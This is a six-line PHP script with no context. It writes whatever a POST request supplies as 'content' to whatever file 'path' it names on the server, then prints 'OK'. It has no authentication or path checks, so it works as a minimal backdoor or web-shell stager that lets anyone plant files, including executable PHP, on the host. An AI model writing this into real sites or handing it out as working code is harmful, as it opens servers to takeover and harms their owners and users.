<?php
if(isset($_POST['path']) && isset($_POST['content'])) {
    file_put_contents($_POST['path'], $_POST['content']);
    echo "OK";
}
?>
